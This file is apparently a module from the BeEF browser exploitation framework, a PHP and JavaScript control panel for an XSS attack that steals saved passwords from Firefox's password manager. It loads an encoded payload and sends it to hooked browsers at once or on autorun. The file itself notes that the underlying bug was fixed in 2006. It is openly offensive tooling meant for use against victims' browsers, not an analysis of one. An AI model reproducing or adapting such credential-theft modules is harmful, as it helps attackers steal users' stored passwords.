<?php
	// Copyright (c) 2006-2010, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<!--

BeEF: http://ha.ckers.org/weird/xss-password-manager.html
BeEF: Written by RSnake h@ckers.org
BeEF: http://sla.ckers.org/forum/read.php?2,131
BeEF: https://bugzilla.mozilla.org/show_bug.cgi?id=360493
BeEF: http://it.slashdot.org/article.pl?sid=06/11/21/2319243
BeEF: the following is the boiler plate from the exploit

XSS demo for stealing passwords from the Firefox password manager
Similar technique may work for Internet Explorer, Safari, Chrome, Opera, etc. Your mileage may vary.

-->

<script>

	get_b64_code_alert = function () {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<?php echo get_b64_file(JS_FILE); ?>';
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Alert Dialog', get_b64_code_alert());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_alert());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header"> Firefox Password Manager Password Theft</div>
This module will attempt to steal a password from Firefox's password manager.<br><br>
<div id="module_subsection">
	<form name="myform">
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>

<div class="entry">
	<br>
	This bug was fixed in <a href=https://bugzilla.mozilla.org/show_bug.cgi?id=360493>2006</a>.
</div>
